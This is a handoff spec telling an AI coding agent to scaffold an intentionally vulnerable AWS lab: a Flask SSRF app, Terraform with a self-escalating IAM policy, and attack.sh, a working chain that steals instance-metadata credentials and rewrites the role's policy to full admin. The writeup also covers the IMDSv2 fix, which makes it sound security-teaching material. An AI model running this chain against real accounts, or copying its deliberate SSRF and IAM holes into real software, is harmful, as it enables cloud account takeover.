# Claude Code Handoff — Build the "Metadata Mirage" repo

## What this is
A **faithful scaffold task**, not a design task. Every design decision is
already made and every file is specified verbatim below. Your job is to create
the repository exactly as written — do not redesign, "improve", or fill gaps
with your own judgement. If something looks unusual, it is deliberate (this is
an intentionally vulnerable security lab).

## Locked invariants — do NOT change these
- **Role scope is a single privilege-escalation primitive**, not blunt admin.
  The instance role's customer-managed policy grants `iam:CreatePolicyVersion`
  + `iam:SetDefaultPolicyVersion` **scoped to its own ARN**, so the role can
  overwrite its own policy to `*:*` in one call. **Never** attach
  `IAMFullAccess`, `AdministratorAccess`, or any AWS-managed admin policy. This
  is the single most important invariant — the whole lab's value depends on the
  escalation being a real primitive rather than a tautology.
- **The IMDSv2 before/after is one variable**: `enforce_imdsv2`
  (`http_tokens = "optional"` when false → IMDSv1 allowed/vulnerable;
  `"required"` when true → IMDSv2 enforced/hardened). It must be an **in-place**
  metadata update, not an instance rebuild.
- **The SSRF app is intentionally unfiltered.** `app/app.py` fetches any URL
  with no allow-list and no link-local block. Do NOT add validation — that is
  the bug the lab demonstrates.
- **Networking reuses the account's default VPC.** Create no VPC/subnet/IGW —
  this keeps teardown clean. (Data sources only.)

## Directory layout to create
```
metadata-mirage/
├── Makefile
├── README.md
├── NOTICE.md
├── WRITEUP.md
├── .gitignore
├── app/
│   └── app.py
├── attack/
│   └── attack.sh
└── terraform/
    ├── main.tf
    ├── variables.tf
    ├── outputs.tf
    └── user_data.sh.tftpl
```

## What to do
1. Create the tree above and write every file **exactly** as specified in the
   "Files" section (contents are verbatim — preserve them byte-for-byte).
2. Create `.gitignore` with the contents given in its own block below.
3. `chmod +x attack/attack.sh`.
4. `git init`, then an initial commit.
5. Verify syntax only, without touching AWS:
   `terraform -chdir=terraform init` then
   `terraform -chdir=terraform validate` and `terraform -chdir=terraform fmt -check`.
   Fix any *formatting/syntax* errors these surface, but do not alter behaviour
   or the locked invariants.

## What to NOT do
- **Do NOT run `make deploy`, `make attack`, `make harden`, `make destroy`, or
  any `terraform apply` / `aws` command that creates or mutates resources.**
  Those stand up a live, internet-exposed vulnerable box and run a real
  privilege-escalation-to-admin chain. The human runs and records those by hand
  (the recording is the portfolio artifact). `terraform validate`/`fmt` are the
  only Terraform commands you should run, and `init` only to enable validate.
- Do NOT commit any AWS credentials, `.tfstate`, or `.terraform/` (the
  `.gitignore` covers these — make sure the initial commit respects it).

## After you've scaffolded it (human's steps — for reference, don't run these)
1. Edit `terraform/variables.tf` → set `allowed_cidr` to `YOUR_IP/32`.
2. Use an **isolated, throwaway AWS account** only.
3. `make deploy` → wait ~60–90s for user-data → confirm the app URL loads.
4. `asciinema rec`, then `make attack` (records SSRF→admin — the resume-bullet artifact).
5. `make harden`, then `make attack` again (records the before/after; chain now dies at credential theft).
6. `make destroy`, confirm clean, `make clean`.

---

## Files

Each block below is a file. The header is its repo-relative path; the fenced
content is verbatim. Fences use five backticks so the files' own triple-backtick
blocks are preserved.

### `README.md`

`````markdown
# Metadata Mirage

A reproducible AWS lab that chains a web-app **SSRF** into **instance
credential theft** and then into **full administrator** via a single IAM
privilege-escalation primitive — and shows the one-line fix that kills the
whole chain.

> ⚠️ Intentionally vulnerable. Deploy only in an isolated throwaway AWS
> account. Read [`NOTICE.md`](./NOTICE.md) first.

## The finding

A naive link-preview endpoint (`/fetch?url=`) will fetch any URL server-side
with no allow-list. Because the instance still allows **IMDSv1**, an attacker
points that SSRF at `169.254.169.254` and reads the instance role's temporary
credentials. Those creds look narrowly scoped — some S3 reads, a CloudWatch
put — but the role also holds `iam:CreatePolicyVersion` on the very policy
attached to it. One API call rewrites that policy to `*:*`, and the scoped app
role becomes an administrator.

## Layout

```
metadata-mirage/
├── app/app.py                  # the intentionally vulnerable Flask SSRF app
├── terraform/                  # the whole environment as code
│   ├── main.tf                 # VPC data, AMI, SG, IAM (the trap), EC2 (+IMDS toggle)
│   ├── variables.tf            # region, enforce_imdsv2, allowed_cidr, app_port
│   ├── outputs.tf              # ip / role / policy arn (fed into the attack)
│   └── user_data.sh.tftpl      # boots the app as a systemd service
├── attack/attack.sh            # the full offensive chain
├── Makefile                    # deploy / attack / harden / destroy
└── NOTICE.md
```

## Prerequisites

- `terraform` >= 1.5
- `aws` CLI, configured for a **throwaway** account (`aws configure`)
- `jq`, `curl`
- `asciinema` if you are recording the demo
- A region with a **default VPC** (fresh accounts have one)

## Quickstart

```bash
# 1. edit terraform/variables.tf: set allowed_cidr to YOUR_IP/32
make deploy      # stand up the vulnerable lab (IMDSv1 allowed)
make attack      # SSRF -> creds -> pivot -> enumerate -> privesc-to-admin
make harden      # flip to IMDSv2-required, in place
make attack      # same attack, now dead at the credential-theft step
make destroy     # tear it all down
make clean       # remove local terraform state (after destroy)
```

## The attack chain (`make attack`)

1. **SSRF → role name.** `/fetch?url=http://169.254.169.254/.../security-credentials/`
   returns the instance role name.
2. **SSRF → credentials.** Same trick one path deeper returns the role's
   temporary `AccessKeyId` / `SecretAccessKey` / `Token`.
3. **Pivot.** Export the stolen creds; `sts get-caller-identity` confirms you
   are now the instance role.
4. **Enumerate.** List the role's attached policies and read the default
   version — revealing the `CreatePolicyVersion` grant on its own policy.
5. **Boundary check.** `iam list-users` is denied — not admin yet.
6. **Privesc.** `create-policy-version` rewrites the attached policy to `*:*`
   and sets it default.
7. **Boundary check.** `iam list-users` now succeeds — full admin.

## Before / after: the whole defense is one flag

`enforce_imdsv2` (in `variables.tf`) flips the instance metadata options
between `http_tokens = "optional"` (IMDSv1 allowed) and `"required"`
(IMDSv2 enforced). `make harden` sets it to `true` as an **in-place** update —
the box is not rebuilt.

With IMDSv2 required, the attacker's plain `GET` to the metadata endpoint is
rejected (v2 requires a `PUT` to obtain a session token first, which a basic
SSRF cannot do). Step 2 returns nothing and the chain dies before any creds
are stolen — no pivot, no enumeration, no privesc.

## Why the primitive works

`iam:CreatePolicyVersion` lets a principal publish a new version of a
**customer-managed** policy and make it the default. If that policy is attached
to the principal itself, the principal can grant itself anything. It only
works on customer-managed policies — you cannot version an AWS-managed policy,
which is exactly why the lab ships its own. This is the least-privilege lesson:
a role that looks scoped can be one permission away from admin.

## Gotchas

- **Set `allowed_cidr` to your `/32`.** The default `0.0.0.0/0` exposes an
  intentionally vulnerable box to the whole internet.
- **Policy versions cap at 5.** A fresh lab has one or two; if you re-run the
  privesc many times you may hit the limit and need to delete an old version.
- **Default VPC required.** The lab reuses it rather than building networking,
  which keeps teardown clean. Accounts with the default VPC deleted need a
  small `main.tf` change.
- **`make harden` uses a `-var` flag**, so a later bare `make deploy` reverts
  to the vulnerable state. That is intentional — deploy = vulnerable,
  harden = fixed.
- **Propagation.** IAM is eventually consistent; the script sleeps briefly
  after the privesc before re-checking.

## Teardown

`make destroy` removes everything Terraform created (EC2, SG, role, policy,
instance profile). Because the lab builds no VPC and tags every resource with
`Project = metadata-mirage`, you can confirm a clean account by filtering on
that tag. Then `make clean` clears local state.
`````

### `NOTICE.md`

`````markdown
# ⚠️ INTENTIONALLY VULNERABLE — READ BEFORE DEPLOYING

This repository stands up a **deliberately insecure** AWS environment for
security education and demonstration. It is designed to be attacked.

**It intentionally creates:**

- A public-facing web app with an unauthenticated **SSRF** endpoint that will
  fetch link-local metadata targets on an attacker's behalf.
- An EC2 instance with **IMDSv1 allowed** by default, so that SSRF can reach
  the instance metadata service.
- An instance role carrying a **privilege-escalation primitive**
  (`iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion` on its own
  attached policy), which allows escalation to **full administrator**.

**Do not:**

- Deploy this in a shared, production, or otherwise real AWS account.
- Deploy it in an account that holds anything you care about.
- Leave it running. Run `make destroy` as soon as you are done.
- Expose it broadly — set `allowed_cidr` to your own `/32`, not `0.0.0.0/0`.

**Do:**

- Use a **fresh, isolated, throwaway account** dedicated to this lab.
- Tear down (`make destroy`) and verify the account is clean afterward.

You are responsible for anything you stand up with this code.
`````

### `Makefile`

`````makefile
# Metadata Mirage - intentionally vulnerable AWS SSRF -> IAM privesc lab.
# Deploy ONLY in an isolated, throwaway AWS account. See NOTICE.md.

TF := terraform -chdir=terraform

.PHONY: deploy plan attack harden destroy clean help

help:              ## Show this help
	@grep -E '^[a-z]+:.*##' $(MAKEFILE_LIST) | sed 's/:.*## /\t/'

deploy:            ## Stand up the vulnerable lab (IMDSv1 allowed)
	$(TF) init -input=false
	$(TF) apply -auto-approve

plan:              ## Preview changes without applying
	$(TF) plan

attack:            ## Run the full SSRF -> privesc-to-admin chain against the running lab
	@bash attack/attack.sh \
		"$$($(TF) output -raw instance_public_ip)" \
		"$$($(TF) output -raw app_port)" \
		"$$($(TF) output -raw role_name)" \
		"$$($(TF) output -raw app_policy_arn)"

harden:            ## Flip to IMDSv2-required (in place); re-run attack to watch it get blocked
	$(TF) apply -auto-approve -var enforce_imdsv2=true

destroy:           ## Tear down everything Terraform created
	$(TF) destroy -auto-approve

clean:             ## Remove local terraform state/cache (run AFTER destroy)
	rm -rf terraform/.terraform terraform/terraform.tfstate*
`````

### `app/app.py`

`````python
from flask import Flask, request, Response
import os
import requests

app = Flask(__name__)


@app.route("/")
def index():
    return (
        "Metadata Mirage - internal link-preview service\n"
        "Usage: /fetch?url=https://example.com\n"
    )


# INTENTIONALLY VULNERABLE.
# Fetches whatever URL the caller supplies, server-side, with no
# allow-list and no block on link-local (169.254.169.254) targets.
# That is the whole bug: a classic SSRF that can reach the instance
# metadata service on behalf of the attacker.
@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not url:
        return "missing url parameter", 400
    try:
        r = requests.get(url, timeout=5)
        return Response(r.text, status=r.status_code, content_type="text/plain")
    except Exception as e:
        return "fetch error: " + str(e), 502


if __name__ == "__main__":
    port = int(os.environ.get("APP_PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
`````

### `terraform/main.tf`

`````hcl
terraform {
  required_version = ">= 1.5"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.region
}

data "aws_caller_identity" "current" {}

locals {
  app_policy_name = "${var.name_prefix}-app-policy"
  # Deterministic ARN built from account id + name, so the policy can
  # reference ITSELF as a resource without a Terraform dependency cycle.
  app_policy_arn = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:policy/${local.app_policy_name}"
}

# --- Networking: reuse the account's default VPC (fresh accounts have one).
#     We create no VPC infrastructure, so there is nothing extra to tear down. ---
data "aws_vpc" "default" {
  default = true
}

data "aws_subnets" "default" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.default.id]
  }
}

# --- Latest Amazon Linux 2023 x86_64 AMI ---
data "aws_ami" "al2023" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["al2023-ami-2023.*-x86_64"]
  }
  filter {
    name   = "architecture"
    values = ["x86_64"]
  }
}

# --- Security group: only the app port, only from allowed_cidr ---
resource "aws_security_group" "app" {
  name_prefix = "${var.name_prefix}-"
  description = "Metadata Mirage - intentionally vulnerable SSRF app"
  vpc_id      = data.aws_vpc.default.id

  ingress {
    description = "Flask SSRF app"
    from_port   = var.app_port
    to_port     = var.app_port
    protocol    = "tcp"
    cidr_blocks = [var.allowed_cidr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Project = var.name_prefix }
}

# --- The instance role (assumed by EC2) ---
resource "aws_iam_role" "instance" {
  name = "${var.name_prefix}-instance-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })

  tags = { Project = var.name_prefix }
}

# --- The "looks scoped" customer-managed policy that hides the privesc primitive.
#     Benign app perms + the catastrophic pair, scoped to THIS policy:
#       iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion
#     The role can therefore rewrite its own attached policy to *:* in one call.
#     (This only works because it is a CUSTOMER-managed policy - you cannot
#      create versions of an AWS-managed policy. That is the teaching point.) ---
resource "aws_iam_policy" "app" {
  name        = local.app_policy_name
  description = "App runtime policy (intentionally vulnerable - hides a privesc primitive)"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "BenignAppPerms"
        Effect = "Allow"
        Action = [
          "s3:ListAllMyBuckets",
          "s3:GetObject",
          "cloudwatch:PutMetricData"
        ]
        Resource = "*"
      },
      {
        Sid    = "SelfManagePolicyVersions"
        Effect = "Allow"
        Action = [
          "iam:CreatePolicyVersion",
          "iam:SetDefaultPolicyVersion"
        ]
        Resource = local.app_policy_arn
      }
    ]
  })

  tags = { Project = var.name_prefix }
}

resource "aws_iam_role_policy_attachment" "app" {
  role       = aws_iam_role.instance.name
  policy_arn = aws_iam_policy.app.arn
}

resource "aws_iam_instance_profile" "instance" {
  name = "${var.name_prefix}-instance-profile"
  role = aws_iam_role.instance.name
}

# --- The vulnerable EC2 instance ---
resource "aws_instance" "app" {
  ami                         = data.aws_ami.al2023.id
  instance_type               = "t3.micro"
  subnet_id                   = data.aws_subnets.default.ids[0]
  vpc_security_group_ids      = [aws_security_group.app.id]
  iam_instance_profile        = aws_iam_instance_profile.instance.name
  associate_public_ip_address = true

  user_data = templatefile("${path.module}/user_data.sh.tftpl", {
    app_source = file("${path.module}/../app/app.py")
    app_port   = var.app_port
  })

  # The whole before/after lives here.
  #   optional -> IMDSv1 allowed  -> the plain SSRF GET reaches metadata (VULNERABLE)
  #   required -> IMDSv2 enforced -> the plain SSRF GET is rejected  (HARDENED)
  # This is an in-place update, so `make harden` flips it without rebuilding the box.
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = var.enforce_imdsv2 ? "required" : "optional"
    http_put_response_hop_limit = 1
  }

  tags = {
    Name    = "${var.name_prefix}-app"
    Project = var.name_prefix
  }
}
`````

### `terraform/variables.tf`

`````hcl
variable "region" {
  description = "AWS region to deploy the lab into."
  type        = string
  default     = "us-east-1"
}

variable "enforce_imdsv2" {
  description = "false = IMDSv1 allowed (VULNERABLE). true = IMDSv2 required (HARDENED). This single flag is the before/after."
  type        = bool
  default     = false
}

variable "allowed_cidr" {
  description = "CIDR allowed to reach the app port. SET THIS TO YOUR OWN /32. 0.0.0.0/0 exposes an intentionally-vulnerable SSRF box to the whole internet."
  type        = string
  default     = "0.0.0.0/0"
}

variable "app_port" {
  description = "TCP port the Flask SSRF app listens on."
  type        = number
  default     = 5000
}

variable "name_prefix" {
  description = "Name/tag prefix on every resource, so teardown is easy to audit."
  type        = string
  default     = "metadata-mirage"
}
`````

### `terraform/outputs.tf`

`````hcl
output "instance_public_ip" {
  description = "Public IP of the vulnerable instance."
  value       = aws_instance.app.public_ip
}

output "app_url" {
  description = "Base URL of the SSRF app."
  value       = "http://${aws_instance.app.public_ip}:${var.app_port}"
}

output "app_port" {
  description = "Port the app listens on."
  value       = var.app_port
}

output "role_name" {
  description = "Name of the over-permissioned instance role."
  value       = aws_iam_role.instance.name
}

output "app_policy_arn" {
  description = "ARN of the customer-managed policy the role can overwrite."
  value       = aws_iam_policy.app.arn
}

output "imdsv2_enforced" {
  description = "false = vulnerable (IMDSv1 allowed), true = hardened (IMDSv2 required)."
  value       = var.enforce_imdsv2
}
`````

### `terraform/user_data.sh.tftpl`

`````bash
#!/bin/bash
set -euxo pipefail

# Runtime deps (AL2023)
dnf install -y python3 python3-pip

# Isolated venv so we do not fight the system package manager
python3 -m venv /opt/app/venv
/opt/app/venv/bin/pip install --upgrade pip
/opt/app/venv/bin/pip install flask requests

# App source is injected by Terraform's templatefile() from ../app/app.py
mkdir -p /opt/app
cat > /opt/app/app.py <<'APP_EOF'
${app_source}
APP_EOF

# Run it as a service on ${app_port}
cat > /etc/systemd/system/mirage-app.service <<'SVC_EOF'
[Unit]
Description=Metadata Mirage vulnerable SSRF app
After=network.target

[Service]
Environment=APP_PORT=${app_port}
ExecStart=/opt/app/venv/bin/python /opt/app/app.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
SVC_EOF

systemctl daemon-reload
systemctl enable --now mirage-app.service
`````

### `attack/attack.sh`

`````bash
#!/usr/bin/env bash
# Metadata Mirage - full offensive chain.
# SSRF -> IMDS creds -> identity pivot -> IAM enumeration -> privesc-to-admin.
#
# Usage: attack.sh <target_ip> <app_port> <role_name> <app_policy_arn>
# Requires: curl, jq, aws cli.
set -uo pipefail

TARGET="${1:?target ip required}"
PORT="${2:?app port required}"
ROLE="${3:?role name required}"
POLICY_ARN="${4:?app policy arn required}"

IMDS="http://169.254.169.254/latest/meta-data/iam/security-credentials"
SSRF="http://${TARGET}:${PORT}/fetch?url="

banner() { echo; echo "=== $* ==="; }

banner "1. SSRF -> leak the instance role name from IMDS"
ROLE_NAME="$(curl -s "${SSRF}${IMDS}/")"
echo "leaked role: ${ROLE_NAME}"

banner "2. SSRF -> steal the role's temporary credentials"
CREDS="$(curl -s "${SSRF}${IMDS}/${ROLE_NAME}")"
echo "${CREDS}"

AKID="$(echo "${CREDS}" | jq -r '.AccessKeyId // empty')"
SAK="$(echo "${CREDS}" | jq -r '.SecretAccessKey // empty')"
TOK="$(echo "${CREDS}" | jq -r '.Token // empty')"

if [ -z "${AKID}" ]; then
  echo
  echo ">> No credentials returned."
  echo ">> If IMDSv2 is enforced, the attacker's plain GET to IMDS is rejected."
  echo ">> That is the HARDENED state - the chain dies right here. Nothing to escalate."
  exit 0
fi

# From here on every AWS call runs AS the stolen instance role.
export AWS_ACCESS_KEY_ID="${AKID}"
export AWS_SECRET_ACCESS_KEY="${SAK}"
export AWS_SESSION_TOKEN="${TOK}"

banner "3. Pivot -> confirm who we are with the stolen creds"
aws sts get-caller-identity

banner "4. Enumerate -> what is this role allowed to do?"
aws iam list-attached-role-policies --role-name "${ROLE}"
echo "--- current (default) version of the app policy ---"
VER="$(aws iam get-policy --policy-arn "${POLICY_ARN}" --query 'Policy.DefaultVersionId' --output text)"
aws iam get-policy-version --policy-arn "${POLICY_ARN}" --version-id "${VER}" \
  --query 'PolicyVersion.Document' --output json
echo ">> Note: the role can CreatePolicyVersion + SetDefaultPolicyVersion on its OWN policy."

banner "5. Boundary check BEFORE privesc (expected: AccessDenied)"
aws iam list-users --max-items 1 || echo "(denied, as expected - not admin yet)"

banner "6. PRIVESC -> overwrite our own attached policy with *:* and set it default"
cat > /tmp/mirage-admin.json <<'ADMIN_EOF'
{
  "Version": "2012-10-17",
  "Statement": [ { "Effect": "Allow", "Action": "*", "Resource": "*" } ]
}
ADMIN_EOF
aws iam create-policy-version \
  --policy-arn "${POLICY_ARN}" \
  --policy-document file:///tmp/mirage-admin.json \
  --set-as-default

echo "waiting for policy propagation..."
sleep 10

banner "7. Boundary check AFTER privesc (expected: now allowed = full admin)"
aws iam list-users --max-items 5

banner "DONE"
echo "Scoped app role -> full administrator, via one SSRF and one IAM API call."
`````

### `WRITEUP.md`

`````markdown
# Metadata Mirage — SSRF to AWS Administrator, and the One Flag That Stops It

> Draft to reconcile against your existing ~80%. Structured on the IMDSv2
> before/after; the privesc-to-admin section (5) and the root-cause section (7)
> are the parts that were missing. Merge, don't wholesale-replace — keep your
> own gotchas.

## 1. Summary

A single unauthenticated SSRF in a link-preview endpoint escalates, with no
further vulnerabilities, to full AWS administrator. The path is entirely
misconfiguration: a server-side fetch with no allow-list, an instance that
still accepts IMDSv1, and an instance role that looks scoped but carries one
catastrophic IAM permission. The entire chain is defeated by enforcing IMDSv2 —
a single instance-metadata flag — which is the point of the lab: the fix is
smaller than the bug.

## 2. The environment

Everything is Terraform (`make deploy`). A `t3.micro` runs a Flask app whose
`/fetch?url=` endpoint issues a server-side `GET` to any URL it is handed, with
no filtering. The instance profile carries a customer-managed policy that reads,
on paper, like an ordinary app role: `s3:ListAllMyBuckets`, `s3:GetObject`,
`cloudwatch:PutMetricData` — plus `iam:CreatePolicyVersion` and
`iam:SetDefaultPolicyVersion` scoped to that same policy. IMDSv1 is allowed by
default (`http_tokens = optional`).

## 3. SSRF to instance credentials

The metadata service lives at the link-local address `169.254.169.254`. Because
the app fetches attacker-controlled URLs server-side, pointing it at
`/latest/meta-data/iam/security-credentials/` returns the role name, and one
path deeper returns the role's temporary credentials. IMDSv1 asks for nothing
in return — a bare `GET` is enough — so a basic SSRF is sufficient. Exporting
those three values and calling `sts get-caller-identity` confirms the pivot:
requests now run as the instance role.

## 4. Enumeration: the role that looks scoped

Listing the role's attached policies and reading the default version surfaces
the trap. The S3 and CloudWatch grants are noise. The line that matters is
`iam:CreatePolicyVersion` on the policy's own ARN. A boundary check —
`iam list-users` — is denied, which is worth recording: at this point the role
is genuinely not an administrator.

## 5. Privilege escalation to administrator

`CreatePolicyVersion` publishes a new version of a customer-managed policy;
`SetDefaultPolicyVersion` makes it live. Because the policy is attached to the
role wielding these permissions, the role can rewrite its own grants. One call
publishes a `{ "Effect": "Allow", "Action": "*", "Resource": "*" }` document as
the new default. After a brief propagation wait, the same `iam list-users` that
was denied moments earlier succeeds. The scoped app role is now an
administrator, reached with one SSRF and one IAM call.

The reason this is a *primitive* and not a curiosity: it only works on
customer-managed policies — AWS-managed policies cannot be versioned — which is
why the lab ships its own policy rather than attaching `IAMFullAccess`. That
distinction is the whole lesson. `IAMFullAccess` would have made the escalation
tautological ("it had admin, so it got admin"). A single, narrow-looking,
self-referential permission is the realistic misconfiguration, and it is
indistinguishable from a benign app role until you read it closely.

## 6. The fix: enforce IMDSv2

`make harden` flips `enforce_imdsv2` to `true`, setting `http_tokens =
required` as an in-place metadata update. IMDSv2 is session-oriented: a client
must first `PUT` to obtain a token and then present it on the `GET`. A basic
SSRF can only issue the `GET`. Re-running the identical attack, step 3 now
returns nothing — the credential theft fails, and with no credentials there is
no pivot, no enumeration, and no privesc. The rest of the misconfiguration
(the over-broad role, the unfiltered fetch) is still present, but the chain
never reaches it. That is the honest framing for the before/after: IMDSv2 does
not fix the app or the role; it severs the link that turns an app bug into an
account compromise.

## 7. Root cause: broken access control, cloud and IoT

The escalation is not a memory bug or a parser trick. It is broken access
control: a principal holding a permission over a resource it should not be able
to rewrite. That is the same failure I demonstrated in the MQTT broker lab,
where an unscoped `#` subscription and missing per-tenant ACLs let one tenant
read and publish across the whole namespace — up to sending an unlock command
to another tenant's command topic. Different protocol, identical root cause:
authorization boundaries that were assumed rather than enforced. In AWS the
boundary is an IAM policy that grants one permission too many; in MQTT it is a
topic ACL that was never written. Least privilege is the same control in both,
and both labs are really one argument: the exploitable gap is almost never the
exotic vulnerability — it is the boundary nobody scoped.

## 8. Reproduce

```
make deploy      # vulnerable
make attack      # SSRF -> creds -> pivot -> enumerate -> admin
make harden      # IMDSv2 required, in place
make attack      # dead at credential theft
make destroy
```

Intentionally vulnerable; isolated throwaway account only. See `NOTICE.md`.
`````

### `.gitignore`

`````gitignore
# Terraform state & cache
terraform/.terraform/
*.tfstate
*.tfstate.*
crash.log

# Local scratch
mirage-admin.json
`````

---

End of handoff. Scaffold, commit, validate — then stop and hand back to the human for the live run + recording.